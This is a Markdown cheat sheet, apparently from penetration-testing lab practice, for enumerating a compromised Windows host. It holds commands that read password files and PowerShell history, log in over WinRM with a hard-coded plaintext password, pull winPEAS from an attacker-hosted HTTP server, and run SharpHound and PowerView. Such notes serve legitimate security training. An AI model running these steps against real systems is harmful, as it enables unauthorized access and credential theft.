# Windows Enumeration Manual and Automated methodolgy

## Initial Access

### Enter Another User Context Using `runas`
```powershell
runas /user:domain\username cmd
```

## File Enumeration

### List Specific File Types in All User Directories
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### List Specific File Types for a Specific User
```powershell
Get-ChildItem -Path C:\Users\malek -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### List All .txt Files Recursively
```powershell
Get-ChildItem -Filter *.txt -Recurse
```

### Read a Specific File
```powershell
type C:\xampp\passwords.txt
```

## History and Network Configuration

### Check PowerShell History
```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Enumerate Network Configuration
```powershell
Write-Output "=== Network Configuration ==="
Get-NetIPAddress
Get-NetAdapter
Get-DnsClient
Get-NetRoute
```

## User Accounts and Groups

### List User Accounts
```powershell
Write-Output "`n=== User Accounts ==="
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
net user steve
```

## Installed Software

### Enumerate Installed Software
```powershell
Write-Output "`n=== Installed Software ==="
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor, InstallDate
```

## Services and Processes

### Enumerate Running Services and Processes
```powershell
Write-Output "`n=== Running Services ==="
Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-Process
```

## Network Connections and Scheduled Tasks

### List Active Network Connections
```powershell
Write-Output "`n=== Active Network Connections ==="
Get-NetTCPConnection
```

### Enumerate Scheduled Tasks
```powershell
Write-Output "`n=== Scheduled Tasks ==="
Get-ScheduledTask
```

## File Shares and Firewall Configuration

### Enumerate File Shares
```powershell
Write-Output "`n=== File Shares ==="
Get-SmbShare
```

### Enumerate Firewall Configuration
```powershell
Write-Output "`n=== Firewall Configuration ==="
Get-NetFirewallRule
Get-NetFirewallProfile
```

## System Information

### Gather System Information
```powershell
Write-Output "`n=== System Information ==="
Get-ComputerInfo
systeminfo
```

## XAMPP and SQL Injection Enumeration

### Read XAMPP MySQL Configuration
```powershell
type C:\xampp\mysql\bin\my.ini
```

## Creating and Using Credentials Object

### Create a Credentials Object
```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

## Entering User via WinRM

### Access a User via WinRM
```powershell
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!”
```

## Checking for DPAPI

### Initial Reconnaissance
- Nmap Scan: `nmap -p- <target>`
- Enum4linux: `enum4linux <target>`
- SMBMap: `smbmap -H <target>`

### WinPEAS Enumeration
```powershell
# Setting up WinPEAS via local server
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe | Select-String -Pattern "Master"
```

### SharpHound Enumeration
```powershell
git clone https://github.com/BloodHoundAD/SharpHound3.git
.\SharpHound3\SharpHound.exe -c all
```

### BloodHound Analysis
- Transfer data to BloodHound server.
- Analyze data using BloodHound web interface.

### PowerView Enumeration
```powershell
git clone https://github.com/PowerShellMafia/PowerSploit.git
Import-Module .\PowerSploit\Reconnaissance\PowerView.ps1
```

### Windows Exploit Suggester
```powershell
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database <database file> --systeminfo <systeminfo file>
```
```

This readme provides a detailed and organized approach to manually and automatically enumerate a Windows system, covering all essential aspects for a thorough analysis.
